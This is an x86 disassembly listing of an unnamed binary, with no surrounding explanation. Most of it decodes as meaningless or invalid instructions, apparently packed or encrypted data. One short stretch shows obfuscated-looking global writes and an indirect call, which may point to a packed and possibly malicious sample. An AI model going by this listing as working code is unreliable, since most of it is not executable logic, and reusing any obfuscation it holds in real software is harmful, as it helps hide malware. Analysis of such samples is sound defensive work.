  4017f6:	mov    bl,0x59
  4017f8:	mov    ebp,0x844af316
  4017fd:	int    0x1
  4017ff:	loope  0x401787
  401801:	neg    BYTE PTR [eax+ecx*4-0x8]
  401805:	mov    ch,0xae
  401807:	ins    BYTE PTR es:[edi],dx
  401808:	xor    esp,DWORD PTR [ebp-0x4a]
  40180b:	sbb    bh,BYTE PTR [eax]
  40180d:	jl     0x4017b2
  40180f:	push   ss
  401810:	stos   DWORD PTR es:[edi],eax
  401811:	repnz aaa 
  401813:	mov    ds:0x550b7537,eax
  401818:	in     eax,0xf8
  40181a:	push   ecx
  40181b:	sub    dl,BYTE PTR [eax+0x10]
  40181e:	ret    0xf66b
  401821:	dec    eax
  401822:	sub    DWORD PTR [esi],esp
  401824:	jg     0x401885
  401826:	loopne 0x4018a0
  401828:	sbb    BYTE PTR [esi],bl
  40182a:	loope  0x401803
  40182c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40182d:	daa    
  40182e:	push   cs
  40182f:	and    dl,BYTE PTR [edi]
  401831:	pop    edx
  401832:	xchg   esi,eax
  401833:	(bad)
  401837:	add    DWORD PTR [eax+0x4b7af53c],esi
  40183d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40183e:	inc    edx
  40183f:	fbld   TBYTE PTR [ebx]
  401841:	mov    cl,0x2b
  401843:	mov    bh,0xd0
  401845:	mov    WORD PTR [ebx-0x64],gs
  401848:	push   edx
  401849:	addr16 pop edx
  40184b:	dec    ecx
  40184c:	adc    al,0x4
  40184e:	icebp  
  40184f:	cs int 0x4f
  401852:	rcr    DWORD PTR [ecx+0x53],1
  401855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401856:	(bad)  
  401857:	cmp    eax,0x9ac83d3a
  40185c:	gs ret 0x3f68
  401860:	or     ah,BYTE PTR [edi+ecx*2+0x4695784d]
  401867:	xor    al,0xd0
  401869:	inc    ecx
  40186a:	cwde   
  40186b:	xchg   ebx,eax
  40186c:	dec    ebx
  40186d:	push   cs
  40186e:	and    DWORD PTR [ecx-0x4f],ebx
  401871:	adc    al,dh
  401873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401874:	mov    esi,0xc2cdd7db
  401879:	mov    ecx,DWORD PTR [ebx]
  40187b:	cld    
  40187c:	inc    ebx
  40187d:	scas   al,BYTE PTR es:[edi]
  40187e:	out    dx,al
  40187f:	repnz and BYTE PTR [ebx-0x2c1d12cf],cl
  401886:	into   
  401887:	and    ebp,DWORD PTR [ebx+0x64884b1f]
  40188d:	clc    
  40188e:	ret    0x216d
  401891:	rcr    ch,0x4c
  401894:	add    eax,0x157e0e17
  401899:	pop    esp
  40189a:	mov    eax,ds:0x81ee097b
  40189f:	pop    ebx
  4018a0:	loop   0x4018c6
  4018a2:	sub    esp,edx
  4018a4:	mov    WORD PTR [edi-0x3c9f37e],cs
  4018aa:	dec    ebp
  4018ab:	jb     0x4018e2
  4018ad:	mov    cl,0x40
  4018af:	jecxz  0x4018ae
  4018b1:	jle    0x4018d5
  4018b3:	cmc    
  4018b4:	push   edx
  4018b5:	data16 sub al,0x23
  4018b8:	jno    0x40188e
  4018ba:	mov    esp,0x77d4b4e
  4018bf:	mov    cl,0xa8
  4018c1:	sbb    esi,DWORD PTR [ebp-0x5a]
  4018c4:	je     0x401885
  4018c6:	mov    eax,ds:0x2ab429c6
  4018cb:	es jmp 0xf45daf17
  4018d1:	fisttp DWORD PTR [esp+eax*8-0x7d0177c7]
  4018d8:	jmp    0xd9b584ef
  4018dd:	mov    ebp,0x921eaeb1
  4018e2:	or     eax,0xa1158da8
  4018e7:	test   BYTE PTR [edx],0x50
  4018ea:	mov    BYTE PTR [ecx-0x1a540a0b],dh
  4018f0:	lahf   
  4018f1:	ret    
  4018f2:	xor    eax,0x47ae419a
  4018f7:	push   es
  4018f8:	lahf   
  4018f9:	pushf  
  4018fa:	cmp    dh,BYTE PTR [edi+0x2c]
  4018fd:	pop    edi
  4018fe:	fcmovu st,st(1)
  401900:	enter  0xb15c,0xcf
  401904:	xor    BYTE PTR [esi+0x0],bl
  401907:	inc    ebp
  401908:	(bad)  
  401909:	rcl    BYTE PTR [edi+ecx*2+0x44b41a12],cl
  401910:	and    bh,BYTE PTR [esi-0x2bb9073b]
  401916:	test   eax,0xb526126a
  40191b:	fisttp QWORD PTR [esi+0x0]
  40191e:	in     al,0x5
  401920:	push   eax
  401921:	and    dl,BYTE PTR [edi+0x65]
  401924:	sub    eax,0x8eec6333
  401929:	cdq    
  40192a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40192b:	jmp    0x401999
  40192d:	adc    DWORD PTR [ecx],0x9b3ed0a4
  401933:	pop    ecx
  401934:	arpl   WORD PTR [edx+0x754515ff],dx
  40193a:	xchg   esp,eax
  40193b:	lea    esi,[eax-0x25]
  40193e:	sbb    eax,0xd194fa5b
  401943:	daa    
  401944:	fmulp  st(6),st
  401946:	cmp    DWORD PTR [eax+0x33],ebp
  401949:	and    DWORD PTR [ebp+0x18],edi
  40194c:	cmp    al,BYTE PTR [edx+0x1f3817df]
  401952:	rol    esp,cl
  401954:	jmp    0x4018df
  401956:	fwait
  401957:	add    DWORD PTR [edi-0x66e5b454],esp
  40195d:	sahf   
  40195e:	sub    al,0x2
  401960:	cwde   
  401961:	stos   BYTE PTR es:[edi],al
  401962:	out    0x89,eax
  401964:	test   ecx,edi
  401966:	add    eax,0xa8e57852
  40196b:	add    al,0xf3
  40196d:	lods   al,BYTE PTR ds:[esi]
  40196e:	retf   
  40196f:	push   esp
  401970:	and    cl,0xcb
  401973:	mov    ah,0x25
  401975:	add    edx,ecx
  401977:	mov    cl,0xdf
  401979:	ss xchg ecx,eax
  40197b:	out    dx,eax
  40197c:	add    al,0x74
  40197e:	test   al,0x12
  401980:	out    0xfd,al
  401982:	or     eax,0x8aa78242
  401987:	jg     0x4019fd
  401989:	ficomp DWORD PTR [edi+eiz*8+0x57020b53]
  401990:	sbb    eax,0x88edef3f
  401995:	pusha  
  401996:	mov    ch,0x73
  401998:	mov    bh,0xc9
  40199a:	aaa    
  40199b:	enter  0xa8c8,0xe6
  40199f:	adc    dl,0x82
  4019a2:	push   edx
  4019a3:	and    BYTE PTR [ebp-0x7096aa26],ah
  4019a9:	mov    ds:0x8b131121,eax
  4019ae:	ss nop
  4019b0:	(bad)  
  4019b1:	pop    ds
  4019b2:	adc    ch,BYTE PTR fs:[eax+0x1e]
  4019b6:	mov    al,ds:0x5777f834
  4019bb:	ja     0x4019a7
  4019bd:	jno    0x4019cf
  4019bf:	sbb    DWORD PTR [esi+0x42573bb4],0xffffffb4
  4019c6:	cld    
  4019c7:	std    
  4019c8:	cmp    DWORD PTR [ecx+edx*2-0x7fed8e16],edi
  4019cf:	fwait
  4019d0:	mov    WORD PTR [eax-0x2e324f7f],ss
  4019d6:	ret    
  4019d7:	adc    DWORD PTR [esi-0x42],0x221798bd
  4019de:	cmp    BYTE PTR [edx-0x3f],0x7e
  4019e2:	mov    eax,ds:0xd5ee8faf
  4019e7:	pop    eax
  4019e8:	jmp    0x6bd9:0xc4b16dca
  4019ef:	rcl    DWORD PTR [esi],cl
  4019f1:	mov    edx,0xde2aedfd
  4019f6:	out    0x64,eax
  4019f8:	xor    esi,DWORD PTR [ebx]
  4019fa:	int    0x38
  4019fc:	cmp    DWORD PTR [ebx+0x6bc1a08a],edi
  401a02:	push   es
  401a03:	and    DWORD PTR [ecx-0x56],esp
  401a06:	lods   al,BYTE PTR ds:[esi]
  401a07:	mov    al,0x39
  401a09:	push   ss
  401a0a:	inc    eax
  401a0b:	xor    ecx,eax
  401a0d:	inc    ecx
  401a0e:	sub    ch,BYTE PTR [esi]
  401a10:	cwde   
  401a11:	dec    esi
  401a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a13:	int3   
  401a14:	sub    eax,0x499d7165
  401a19:	sub    esp,DWORD PTR [ecx+0x51f96a02]
  401a1f:	outs   dx,BYTE PTR ds:[esi]
  401a20:	sahf   
  401a21:	push   ds
  401a22:	push   esp
  401a23:	ret    0x6b13
  401a26:	cmc    
  401a27:	mov    edi,0x183909a1
  401a2c:	mov    ah,0x45
  401a2e:	pop    esi
  401a2f:	scas   eax,DWORD PTR es:[edi]
  401a30:	xor    al,0x2e
  401a32:	(bad)  
  401a34:	sbb    ch,ch
  401a36:	push   esi
  401a37:	mov    es,WORD PTR [ecx+0x3e54620f]
  401a3d:	cmp    ch,ah
  401a3f:	mov    dl,0x23
  401a41:	fsub   st,st(4)
  401a43:	push   edx
  401a44:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  401a46:	push   ds
  401a47:	mov    WORD PTR [eax+0x3d],es
  401a4a:	adc    al,0x5e
  401a4c:	jb     0x401a66
  401a4e:	jle    0x401a9b
  401a50:	and    bl,BYTE PTR [edx]
  401a52:	sub    ebp,DWORD PTR [ecx+0x79]
  401a55:	xchg   DWORD PTR [edi+0x77],ebp
  401a58:	pop    ebp
  401a59:	mov    al,ds:0x524b02b3
  401a5e:	ficomp DWORD PTR [ecx-0x312a8a9b]
  401a64:	mov    esi,0xd9d964d1
  401a69:	test   eax,0x1bca2c02
  401a6e:	xor    ah,BYTE PTR [esi]
  401a70:	push   ecx
  401a71:	pushf  
  401a72:	xor    dh,BYTE PTR [ebx+eiz*2-0x7e9726ae]
  401a79:	hlt    
  401a7a:	hlt    
  401a7b:	push   cs
  401a7c:	sub    al,BYTE PTR [eax+0x3d]
  401a7f:	test   dl,ah
  401a81:	aaa    
  401a82:	stos   DWORD PTR es:[edi],eax
  401a83:	or     DWORD PTR [ebx],edi
  401a85:	inc    edx
  401a86:	sbb    DWORD PTR [ebp+0x5c],0x9c8d9386
  401a8d:	out    dx,eax
  401a8e:	push   0x85754141
  401a93:	xchg   ebx,eax
  401a94:	add    eax,0xe2f6a325
  401a99:	add    BYTE PTR [ecx],0xb3
  401a9c:	push   esi
  401a9d:	dec    esp
  401a9e:	push   ss
  401a9f:	mov    ebx,esp
  401aa1:	loopne 0x401ad9
  401aa3:	or     bh,ah
  401aa5:	call   0xce824c9d
  401aaa:	iret   
  401aab:	sahf   
  401aac:	cmp    bl,BYTE PTR [esi+eax*4]
  401aaf:	mov    esi,DWORD PTR [edi+eiz*4]
  401ab2:	sbb    al,0x13
  401ab4:	in     al,dx
  401ab5:	jmp    0x401aa9
  401ab7:	das    
  401ab8:	sbb    al,0x4a
  401aba:	jbe    0x401a52
  401abc:	test   al,0xa5
  401abe:	stc    
  401abf:	jmp    0x401a93
  401ac1:	xor    BYTE PTR [esi-0x2077e4b3],ah
  401ac7:	or     bh,ch
  401ac9:	ret    
  401aca:	je     0x401a75
  401acc:	push   ss
  401acd:	cmp    dh,bl
  401acf:	rcr    ebx,1
  401ad1:	call   0x536c6ef6
  401ad6:	jle    0x401afb
  401ad8:	sahf   
  401ad9:	jge    0x401b4c
  401adb:	mov    ecx,0xf6b7b052
  401ae0:	pop    ecx
  401ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ae3:	pop    esp
  401ae4:	dec    esp
  401ae5:	mov    ah,0xb5
  401ae7:	or     al,0x9d
  401ae9:	inc    ebx
  401aea:	mov    edx,0xed15895e
  401aef:	call   0xd1db416e
  401af4:	imul   DWORD PTR [edi+0x30]
  401af7:	jge    0x401aad
  401af9:	test   al,0x79
  401afb:	xchg   BYTE PTR [ecx],al
  401afd:	shl    DWORD PTR [ecx-0x12df630c],cl
  401b03:	fst    st(4)
  401b05:	push   ebx
  401b06:	jns    0x401b2f
  401b08:	imul   ecx,DWORD PTR [edx-0x7c2e75ad],0x14
  401b0f:	mov    WORD PTR [edx-0x26379a4],?
  401b15:	push   ecx
  401b16:	push   es
  401b17:	mov    edx,0x3653d8c5
  401b1c:	inc    eax
  401b1d:	push   eax
  401b1e:	mov    bh,0x30
  401b20:	or     eax,0xdc695235
  401b25:	mov    ecx,?
  401b27:	repnz adc ebp,DWORD PTR [esi+0x61]
  401b2b:	and    BYTE PTR [eax-0x6b],ah
  401b2e:	push   0x18
  401b30:	jle    0x401aed
  401b32:	cmc    
  401b33:	pop    DWORD PTR [ecx-0x4f30605]
  401b39:	cwde   
  401b3a:	push   ecx
  401b3b:	add    eax,0xa9e82ed2
  401b40:	imul   ebp,DWORD PTR [eax+0x70d2e0e2],0x37
  401b47:	sub    cl,bh
  401b49:	call   0xbc9f7b8b
  401b4e:	add    al,0x65
  401b50:	addr16 jo 0x401b33
  401b53:	das    
  401b54:	cmp    al,0x80
  401b56:	jl     0x401bd0
  401b58:	push   ebx
  401b59:	mov    bl,0x6
  401b5b:	sahf   
  401b5c:	ret    
  401b5d:	jp     0x401b6b
  401b5f:	mov    ecx,0x576574f0
  401b64:	stc    
  401b65:	enter  0x6154,0x92
  401b69:	mov    ebp,0x74fab9b0
  401b6e:	in     al,0xa1
  401b70:	pop    esp
  401b71:	sbb    DWORD PTR [esi-0x2a818a08],esi
  401b77:	add    bh,ah
  401b79:	push   edx
  401b7a:	inc    ebx
  401b7b:	outs   dx,BYTE PTR ds:[esi]
  401b7c:	retf   0x795a
  401b7f:	scas   eax,DWORD PTR es:[edi]
  401b80:	and    cl,dh
  401b82:	ret    0x2584
  401b85:	lods   eax,DWORD PTR ds:[esi]
  401b86:	clc    
  401b87:	dec    eax
  401b88:	test   eax,0xcea3bb84
  401b8d:	aad    0x12
  401b8f:	cmp    BYTE PTR [edi+0x35],ch
  401b92:	xchg   BYTE PTR [ecx-0x69],dh
  401b95:	push   eax
  401b96:	mov    ch,0x0
  401b98:	mov    WORD PTR [ebx],cs
  401b9a:	stos   DWORD PTR es:[edi],eax
  401b9b:	xor    DWORD PTR [ecx+0x41c972e7],esi
  401ba1:	lahf   
  401ba2:	std    
  401ba3:	jmp    0x87b6:0x2878e059
  401baa:	(bad)  
  401bab:	push   0xfffffffb
  401bad:	fwait
  401bae:	sbb    BYTE PTR [ecx-0x2f769d17],bl
  401bb4:	add    ch,BYTE PTR [ecx-0x73]
  401bb7:	or     eax,0x2a7a0268
  401bbc:	add    eax,DWORD PTR [ebx]
  401bbe:	clc    
  401bbf:	dec    ebx
  401bc0:	rcl    BYTE PTR [edi-0x7e826a29],cl
  401bc6:	dec    ebp
  401bc7:	into   
  401bc8:	mov    ds:0xd9c5330f,eax
  401bcd:	test   DWORD PTR ds:0xb6700821,esi
  401bd3:	sbb    bl,BYTE PTR [ecx+0x2b]
  401bd6:	mov    ecx,DWORD PTR [ebp+0x1c]
  401bd9:	shrd   eax,ecx,0x2
  401bdd:	shr    ecx,0x2
  401be0:	not    edx
  401be2:	mov    ecx,DWORD PTR [ebp+0x18]
  401be5:	dec    edx
  401be6:	mov    edx,DWORD PTR [ebp+0x1c]
  401be9:	xor    eax,edi
  401beb:	adc    DWORD PTR ds:0x42297e,0x4229a2
  401bf5:	xor    edx,edx
  401bf7:	mov    DWORD PTR ds:0x4229ae,0x6bb3
  401c01:	or     edx,eax
  401c03:	adc    DWORD PTR ds:0x422986,0x42289e
  401c0d:	mov    DWORD PTR [ebp-0x3c],edx
  401c10:	neg    eax
  401c12:	mov    DWORD PTR [ebp-0x70],0x2c55
  401c19:	mov    DWORD PTR [ebp-0x6c],0x456f
  401c20:	cmp    DWORD PTR ds:0x4229d2,0x0
  401c27:	mov    DWORD PTR ds:0x42289e,0x7b64
  401c31:	mov    DWORD PTR ds:0x42292a,0x2f7e
  401c3b:	mov    DWORD PTR ds:0x42289a,0x21f
  401c45:	mov    DWORD PTR ds:0x4229ce,0x3163
  401c4f:	jmp    0x401cb0
  401c54:	mov    DWORD PTR ds:0x4228ae,0x1734
  401c5e:	mov    eax,0x7b34
  401c63:	je     0x401c91
  401c69:	push   0x771c
  401c6e:	push   DWORD PTR [ebp-0x18]
  401c71:	call   DWORD PTR ds:0x42a040
  401c77:	and    DWORD PTR ds:0x422996,0x7212
  401c81:	sub    DWORD PTR ds:0x42297e,0x15ec
  401c8b:	and    DWORD PTR ds:0x42290e,ebx
  401c91:	or     DWORD PTR ds:0x42298a,0x1787
  401c9b:	xor    DWORD PTR ds:0x4229aa,0x7558
  401ca5:	mov    eax,ds:0x4228f6
  401caa:	sub    DWORD PTR ds:0x4228fa,eax
  401cb0:	mov    DWORD PTR [ebp-0x70],0x78a6
  401cb7:	movzx  eax,BYTE PTR ds:0x4229a2
  401cbe:	or     DWORD PTR ds:0x4228fe,eax
  401cc4:	jmp    0x40224e
  401cc9:	in     eax,dx
  401cca:	in     al,dx
  401ccb:	test   DWORD PTR [edi+esi*8-0x219a9b7c],0x316e8adf
  401cd6:	loop   0x401d1a
  401cd8:	test   al,0x6a
  401cda:	cli    
  401cdb:	push   ss
  401cdc:	push   ss
  401cdd:	cmp    eax,0x71161604
  401ce2:	mov    BYTE PTR [edi],bl
  401ce4:	pop    ds
  401ce5:	ins    DWORD PTR es:[edi],dx
  401ce6:	jmp    0x401d25
  401ce8:	mov    bh,bl
  401cea:	arpl   WORD PTR [esi],bp
  401cec:	mov    ah,0xb9
  401cee:	add    BYTE PTR [edx-0x2479aacb],0x62
  401cf5:	sub    dl,BYTE PTR [ecx-0x78]
  401cf8:	jl     0x401d76
  401cfa:	test   eax,0xb6c11700
  401cff:	adc    eax,0x76750dea
  401d04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d05:	jle    0x401cde
  401d07:	rcl    BYTE PTR [edx],1
  401d09:	loope  0x401d44
  401d0b:	push   eax
  401d0c:	and    BYTE PTR [eax],0x72
  401d0f:	or     DWORD PTR [ebp+0x227f5e62],eax
  401d15:	mov    ecx,0x5031f3b8
  401d1a:	leave  
  401d1b:	outs   dx,DWORD PTR ds:[esi]
  401d1c:	and    esp,DWORD PTR [ecx+edi*2]
  401d1f:	jmp    0x401da0
  401d21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d22:	into   
  401d23:	jb     0x401cba
  401d25:	mov    ebx,0xba7cbda0
  401d2a:	jo     0x401d99
  401d2c:	sbb    BYTE PTR [edx+0x5b],0xe1
  401d30:	shl    DWORD PTR [edx],1
  401d32:	inc    ebp
  401d33:	loopne 0x401d23
  401d35:	js     0x401db4
  401d37:	jo     0x401d67
  401d39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d3a:	sub    eax,0x33b6f8d
  401d3f:	sbb    al,0xe
  401d41:	adc    bh,BYTE PTR [ebp-0x55]
  401d44:	and    BYTE PTR [edi-0x6b],al
  401d47:	dec    eax
  401d48:	cs pop esi
  401d4a:	add    DWORD PTR [edi],0xffffff8d
  401d4d:	add    eax,0x7523389a
  401d52:	push   cs
  401d53:	jno    0x401d7a
  401d55:	add    DWORD PTR [edx+0x32],ebx
  401d58:	adc    dl,BYTE PTR [ebx]
  401d5a:	push   ebx
  401d5b:	push   cs
  401d5c:	xor    ch,BYTE PTR [ecx+0x77]
  401d5f:	inc    esi
  401d60:	pusha  
  401d61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d62:	fidiv  WORD PTR [edx]
  401d64:	shr    dl,cl
  401d66:	and    BYTE PTR [edx],ah
  401d68:	ins    BYTE PTR es:[edi],dx
  401d69:	add    BYTE PTR [edx+0x26bbad7e],0xb0
  401d70:	fld    DWORD PTR ds:0x5306b324
  401d76:	jge    0x401dde
  401d78:	mov    ch,BYTE PTR [eax]
  401d7a:	jbe    0x401dbb
  401d7c:	jae    0x401d73
  401d7e:	loop   0x401d81
  401d80:	(bad)  
  401d81:	out    dx,al
  401d82:	add    al,BYTE PTR [esi]
  401d84:	iret   
  401d85:	test   eax,0xbab712b9
  401d8a:	(bad)  
  401d8c:	add    dl,BYTE PTR [esi]
  401d8e:	cli    
  401d8f:	fdivr  QWORD PTR [ebp-0x62f4b9da]
  401d95:	mov    bl,0x83
  401d97:	add    DWORD PTR [edx],0xedb285ff
  401d9d:	into   
  401d9e:	call   0xc730:0xdd54946b
  401da5:	popa   
  401da6:	stos   BYTE PTR es:[edi],al
  401da7:	ja     0x401dd4
  401da9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401daa:	call   0x5cd5a27e
  401daf:	mov    cl,0x1b
  401db1:	mov    edi,0x6d296d58
  401db6:	push   eax
  401db7:	mov    eax,0xca50d3b7
  401dbc:	add    DWORD PTR [ecx-0x22],edx
  401dbf:	jmp    0x401d7a
  401dc1:	push   DWORD PTR [eax+0x75]
  401dc4:	sbb    BYTE PTR [edi-0x18],cl
  401dc7:	xor    BYTE PTR [eax-0x347c5e42],dh
  401dcd:	sbb    dl,BYTE PTR [ecx]
  401dcf:	loope  0x401e44
  401dd1:	mov    ds:0xead01b35,eax
  401dd6:	test   BYTE PTR [esi+0xc],cl
  401dd9:	rcr    di,1
  401ddc:	adc    al,0x75
  401dde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ddf:	test   al,0x81
  401de1:	lods   eax,DWORD PTR gs:[esi]
  401de3:	inc    esi
  401de4:	pop    ss
  401de5:	addr16 fwait
  401de7:	dec    eax
  401de8:	pop    esp
  401de9:	sbb    DWORD PTR fs:[edx+0x4e25bdcc],0x714645a3
  401df4:	jo     0x401db5
  401df6:	dec    esi
  401df7:	shr    DWORD PTR [eax+0x15],1
  401dfa:	fcom   DWORD PTR [ecx-0x32]
  401dfd:	inc    esi
  401dfe:	push   cs
  401dff:	out    dx,al
  401e00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e01:	cmc    
  401e02:	mov    ebx,DWORD PTR [edi+0x5e36c4cd]
  401e08:	jmp    FWORD PTR [ebx+ecx*4+0x655cbf38]
  401e0f:	push   es
  401e10:	xchg   edi,eax
  401e11:	push   esp
  401e12:	into   
  401e13:	mov    bh,bh
  401e15:	popf   
  401e16:	mul    DWORD PTR [ebx-0x1a]
  401e19:	dec    edi
  401e1a:	sahf   
  401e1b:	test   eax,0x77dacefc
  401e20:	nop
  401e21:	jo     0x401df0
  401e23:	in     al,dx
  401e24:	adc    eax,0x2ca00829
  401e29:	lahf   
  401e2a:	js     0x401e14
  401e2c:	into   
  401e2d:	mov    dl,0x26
  401e2f:	mov    dh,0x8e
  401e31:	ins    DWORD PTR es:[edi],dx
  401e32:	cmp    eax,0x2056dd7f
  401e37:	(bad)  
  401e38:	jp     0x401e2e
  401e3a:	push   edx
  401e3b:	cld    
  401e3c:	inc    esp
  401e3d:	adc    eax,0x1fb95446
  401e42:	in     al,dx
  401e43:	mov    bh,0x1f
  401e45:	stc    
  401e46:	cli    
  401e47:	xchg   BYTE PTR [eax+eax*2-0x4d],ah
  401e4b:	jl     0x401e55
  401e4d:	pop    ds
  401e4e:	jne    0x401ec1
  401e50:	mov    edx,0xf3fd7bed
  401e55:	sub    eax,0x2f
  401e58:	je     0x401df4
  401e5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e5b:	inc    edx
  401e5c:	arpl   WORD PTR [ebp-0x789c98c5],dx
  401e62:	test   edx,ebp
  401e64:	push   edi
  401e65:	cld    
  401e66:	push   0x70
  401e68:	daa    
  401e69:	js     0x401ee5
  401e6b:	mov    ebx,0xb533b606
  401e70:	sbb    ch,BYTE PTR [eax]
  401e72:	popf   
  401e73:	push   ebx
  401e74:	xchg   esp,esi
  401e76:	inc    edi
  401e77:	or     BYTE PTR [edx+0x28],cl
  401e7a:	js     0x401eb2
  401e7c:	xor    eax,0x72472ee0
  401e81:	inc    ebx
  401e82:	fincstp 
  401e84:	jmp    0xd0e8a467
  401e89:	ins    DWORD PTR es:[edi],dx
  401e8a:	iret   
  401e8b:	sub    eax,0x3d34154c
  401e90:	dec    ebp
  401e91:	adc    cl,dl
  401e93:	sbb    ebx,DWORD PTR [edi]
  401e95:	add    al,0xad
  401e97:	loope  0x401e7d
  401e99:	jne    0x401f02
  401e9b:	(bad)  
  401e9c:	sub    dh,BYTE PTR [edx+0x17]
  401e9f:	into   
  401ea0:	shl    BYTE PTR [edi-0x4b],cl
  401ea3:	xor    esp,DWORD PTR [ecx-0x69067bff]
  401ea9:	mov    ebp,0x6cf0ddae
  401eae:	test   eax,0xc3d9c3e1
  401eb3:	pushf  
  401eb4:	sti    
  401eb5:	call   0xed28:0x26c7e758
  401ebc:	sti    
  401ebd:	mov    ebx,0xccc7e314
  401ec2:	loop   0x401edd
  401ec4:	mov    cl,0x24
  401ec6:	pop    ebx
  401ec7:	test   eax,0x816ef96d
  401ecc:	ds adc al,0x27
  401ecf:	sub    DWORD PTR [ecx+eiz*2-0x1d820195],ecx
  401ed6:	xor    ch,BYTE PTR [eax-0xc3225f5]
  401edc:	push   ebp
  401edd:	dec    ebp
  401ede:	push   ebp
  401edf:	out    dx,eax
  401ee0:	out    dx,al
  401ee1:	push   0x28
  401ee3:	(bad)  
  401ee5:	lahf   
  401ee6:	stos   BYTE PTR es:[edi],al
  401ee7:	in     eax,dx
  401ee8:	jp     0x401f1d
  401eea:	mov    ecx,0x7f054e88
  401eef:	in     eax,dx
  401ef0:	cmp    ecx,DWORD PTR [ebx+0x2852e187]
  401ef6:	xor    dl,BYTE PTR [ecx]
  401ef8:	mov    eax,0xc7553a84
  401efd:	sbb    ecx,eax
  401eff:	adc    DWORD PTR [ebx+0x47],0x6d
  401f03:	jno    0x401f38
  401f05:	not    DWORD PTR [edi-0x32]
  401f08:	jne    0x401ed5
  401f0a:	inc    ebx
  401f0b:	lods   eax,DWORD PTR ds:[esi]
  401f0c:	dec    ebx
  401f0d:	int3   
  401f0e:	lock jecxz 0x401efc
  401f11:	mov    ecx,0x6a8bf8ca
  401f16:	rcr    BYTE PTR [ebp+0x3a],0x81
  401f1a:	ret    
  401f1b:	and    al,BYTE PTR [eax-0x67d9046]
  401f21:	cmp    edi,DWORD PTR [esi+edx*8]
  401f24:	mov    ebp,ecx
  401f26:	test   eax,0x5f804e0f
  401f2b:	mov    bl,0x98
  401f2d:	lea    edi,[ebx+ecx*8-0x17]
  401f31:	mov    dl,0xf9
  401f33:	ss sub al,0x94
  401f36:	xchg   ebx,eax
  401f37:	sbb    cl,BYTE PTR [edi-0x2b8a5588]
  401f3d:	imul   ebx,DWORD PTR [ebp+0x5b],0x42
  401f41:	xacquire xchg DWORD PTR [ebp+edx*4-0x2c3c0900],esp
  401f49:	bound  edi,QWORD PTR [esi-0x65]
  401f4c:	adc    edx,esi
  401f4e:	imul   edi,DWORD PTR [edx+0x78],0xfffffff4
  401f52:	arpl   WORD PTR [edi+0x4eeefa1a],si
  401f58:	lahf   
  401f59:	dec    ebx
  401f5a:	mov    eax,DWORD PTR [esi]
  401f5c:	(bad)  
  401f5d:	ss push 0xffffff9d
  401f60:	mov    eax,ds:0x6dc8a881
  401f65:	pop    edi
  401f66:	inc    ebx
  401f67:	call   esp
  401f69:	iret   
  401f6a:	jnp    0x401f1f
  401f6c:	(bad)  
  401f6d:	int    0xf9
  401f6f:	aam    0x5c
  401f71:	cwde   
  401f72:	adc    BYTE PTR [esi-0x16],ah
  401f75:	ret    0x428a
  401f78:	nop
  401f79:	jbe    0x401f75
  401f7b:	mov    al,0xe1
  401f7d:	lods   eax,DWORD PTR ds:[esi]
  401f7e:	push   esi
  401f7f:	in     al,0x5
  401f81:	adc    DWORD PTR [eax],esp
  401f83:	test   ah,ah
  401f85:	mov    ebx,0x9b76cb94
  401f8a:	jno    0x401f51
  401f8c:	mov    edi,0x8d2818d0
  401f91:	pop    ebp
  401f92:	xchg   DWORD PTR [ebx-0x15b6edb4],edi
  401f98:	mov    esp,DWORD PTR [ebp-0x266b23d9]
  401f9e:	and    al,0xae
  401fa0:	das    
  401fa1:	out    0x65,al
  401fa3:	pushf  
  401fa4:	ret    
  401fa5:	mov    DWORD PTR [ebx+0x40],eax
  401fa8:	dec    ebp
  401fa9:	xchg   edi,eax
  401faa:	ret    
  401fab:	push   ebp
  401fac:	shl    ecx,cl
  401fae:	jmp    0xa20f:0xf693b73b
  401fb5:	or     DWORD PTR [ecx+0x15],ecx
  401fb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fb9:	or     eax,0x358fcfc0
  401fbe:	ins    BYTE PTR es:[edi],dx
  401fbf:	mov    ah,0x70
  401fc1:	(bad)  
  401fc2:	xor    ah,BYTE PTR [ecx-0x40]
  401fc5:	xchg   edx,eax
  401fc6:	cmp    al,0x5c
  401fc8:	sti    
  401fc9:	add    al,0xb1
  401fcb:	lahf   
  401fcc:	xchg   edi,eax
  401fcd:	mov    eax,DWORD PTR [bx]
  401fd0:	leave  
  401fd1:	outs   dx,BYTE PTR ds:[esi]
  401fd2:	leave  
  401fd3:	ss xchg edx,eax
  401fd5:	cld    
  401fd6:	retf   
  401fd7:	test   eax,0x39d3b663
  401fdc:	frstor [ebx-0x35]
  401fdf:	cmp    bh,BYTE PTR ds:0x9a01c4e2
  401fe5:	sbb    ch,al
  401fe7:	sub    BYTE PTR [ebx-0x58],ah
  401fea:	pusha  
  401feb:	ror    BYTE PTR ds:0xd91896f8,cl
  401ff1:	jae    0x401f8a
  401ff3:	and    esp,DWORD PTR [eax]
  401ff5:	gs ret 0x7960
  401ff9:	pop    esi
  401ffa:	sub    DWORD PTR ds:0xce777093,eax
  402000:	scas   eax,DWORD PTR es:[edi]
  402001:	mov    ds:0xcde047e3,eax
  402006:	mov    ebx,0x34e96a2c
  40200b:	call   0xece5:0xdaf8c330
  402012:	xor    ebp,ebx
  402014:	in     al,dx
  402015:	add    eax,0xa386021
  40201a:	stos   DWORD PTR es:[edi],eax
  40201b:	mov    ch,0xbe
  40201d:	jns    0x401ff3
  40201f:	addr16 stc 
  402021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402022:	jle    0x401fca
  402024:	push   ds
